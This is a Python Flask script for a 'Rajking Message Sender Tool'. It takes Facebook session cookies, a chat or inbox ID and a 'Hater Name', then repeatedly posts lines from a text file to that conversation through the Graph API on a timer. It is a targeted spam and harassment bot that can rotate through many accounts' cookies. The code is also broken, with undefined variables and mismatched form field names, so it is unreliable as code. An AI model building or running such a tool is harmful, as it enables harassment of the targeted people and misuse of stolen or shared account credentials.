from flask import Flask, request, jsonify, render_template_string
import threading
import requests
import os
import time
from colorama import Fore, init
import random
import string

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
app.debug = True

tasks = {}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Function to generate random task id
def generate_random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Background function to send messages
def send_messages(task_id, cookies_type, access_cookies, thread_id, messages, mn, time_interval, cookies=None):
    tasks[task_id] = {'running': True}

    token_index = 0
    while tasks[task_id]['running']:
        for message1 in messages:
            if not tasks[task_id]['running']:
                break
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                if cookies_type == 'single':
                    current_cookies = access_cookies
                else:
                    current_cookies = tokens[cookies_index]
                    cookies_index = (cookies_index + 1) % len(tokens)

                parameters = {'access_cookies': current_cookies, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(Fore.GREEN + f"Message sent using cookies {current_cookies}: {message}")
                else:
                    print(Fore.RED + f"Failed to send message using token {current_cookies}: {message}")

                time.sleep(time_interval)
            except Exception as e:
                print(Fore.YELLOW + f"Error while sending message using cookies {current_cookies}: {message}")
                print(e)
                time.sleep(30)

    print(Fore.YELLOW + f"Task {task_id} stopped.")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        cookies_type = request.form.get('cookiesType')
        access_cookies = request.form.get('access cookies')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if cookies_type == 'multi':
            cookies_file = request.files['cookiesFile']
            cookies = cookies_file.read().decode().splitlines()
        else:
            cookies = None

        # Generate random task id
        task_id = generate_random_id()

        # Start the background thread
        thread = threading.Thread(target=send_messages, args=(task_id, token_type, access_cookies, thread_id, messages, mn, time_interval, cookies))
        thread.start()

        return jsonify({'task_id': task_id})

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rajking Message Sender</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: red;
    }
    .container {
      max-width: 400px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      margin: 0 auto;
      margin-top: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
      text-align: center;
      padding-bottom: 10px;
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
    }
    .footer {
      text-align: center;
      margin-top: 10px;
      color: blue;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3">Rajking Message Sender Tool</h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="cookiesType">Select Token Type:</label>
        <select class="form-control" id="cookiesType" name="cookiesType" required>
          <option value="single">Single Cookies</option>
          <option value="multi">Multi Cookies</option>
        </select>
      </div>
      <div class="mb-3">
        <label for="accessCookies">Enter Your Cookies:</label>
        <input type="text" class="form-control" id="accessCookies" name="accessCookies">
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3" id="multiCookiesFile" style="display: none;">
        <label for="tokenFile">Select Token File (for multi-Cookies):</label>
        <input type="file" class="form-control" id="CookiesFile" name="CookiesFile" accept=".txt">
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Start Task</button>
    </form>
  </div>

  <div class="container mt-4">
    <h3>Stop Task</h3>
    <form action="/stop_task" method="post">
      <div class="mb-3">
        <label for="taskId">Enter Task ID:</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
    </form>
  </div>

  <footer class="footer">
    <p>&copy; RAJKING Developed by DeViL BoY 2025. All Rights Reserved.</p>
  </footer>

  <script>
    document.getElementById('tokenType').addEventListener('change', function() {
      var cookieType = this.value;
      document.getElementById('multiCookiesFile').style.display = CookiesType === 'multi' ? 'block' : 'none';
      document.getElementById('access Cookies').style.display = cookiesType === 'multi' ? 'none' : 'block';
    });
  </script>
</body>
</html>
''')

@app.route('/stop_task', methods=['POST'])
def stop_task():
    """Stop a running task based on the task ID."""
    task_id = request.form.get('taskId')
    if task_id in tasks:
        tasks[task_id]['running'] = False
        return jsonify({'status': 'stopped', 'task_id': task_id})
    return jsonify({'status': 'not found', 'task_id': task_id}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True) 